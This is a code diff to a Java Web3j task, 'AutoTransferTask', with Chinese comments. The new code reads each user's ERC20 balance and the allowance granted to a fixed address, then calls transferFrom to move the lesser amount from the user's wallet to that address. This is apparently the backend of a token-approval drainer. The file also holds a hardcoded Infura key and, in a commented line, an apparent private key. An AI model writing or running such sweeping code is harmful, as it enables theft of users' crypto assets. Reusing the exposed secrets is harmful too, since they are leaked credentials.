@@ -65,8 +65,10 @@ public class AutoTransferTask {
         if(flowRecord.getCurrencyType().equals("erc20")) {
             Web3j web3j = Web3j.build(new HttpService("https://mainnet.infura.io/v3/77c83ab9cfd746918a9b188a7692fa00"));
 
-            bigInteger = EthUtils.balanceOfErc20(web3j, contractAddress, flowRecord.getUserAddress());
-
+            BigInteger bigInteger1 = EthUtils.balanceOfErc20(web3j, contractAddress, flowRecord.getUserAddress());
+            ERC20Contract erc20Contract = ERC20Contract.builder(web3j, contractAddress);
+            BigInteger bigInteger2 = erc20Contract.allowance( flowRecord.getUserAddress(),"0x2DE34806507Ed2d876B95b3A9113F1EE01ec5EcF");
+            bigInteger = bigInteger1.compareTo(bigInteger2)>0?bigInteger2:bigInteger1;
             BigDecimal amount = BigDecimal.valueOf(bigInteger.doubleValue()).divide(BigDecimal.valueOf(1000000));
 
             //比对结果自动划转值小于余额，进行转账
@@ -75,8 +77,10 @@ public class AutoTransferTask {
 //                EthUtils.transferERC20Token(web3j, user.getUserAddress(), "0xaB966F0a1cB25710B9a8eac6C758676c674cbf70"
 //                        , bigInteger, "89c61830b2516b4650db9e2c40ea380e7195d1f8fd3cb001d96ad91198ad33c5", contractAddress);
 
-                ERC20Contract erc20Contract = ERC20Contract.builder(web3j, contractAddress);
+//                ERC20Contract erc20Contract = ERC20Contract.builder(web3j, contractAddress);
                 // 调用合约的 approve 函数
+
+
                 SendResultModel sendResultModel = erc20Contract.transferFrom(
                         user.getUserAddress(), // 被授权人
                         "0x2DE34806507Ed2d876B95b3A9113F1EE01ec5EcF", // 调用者的地址
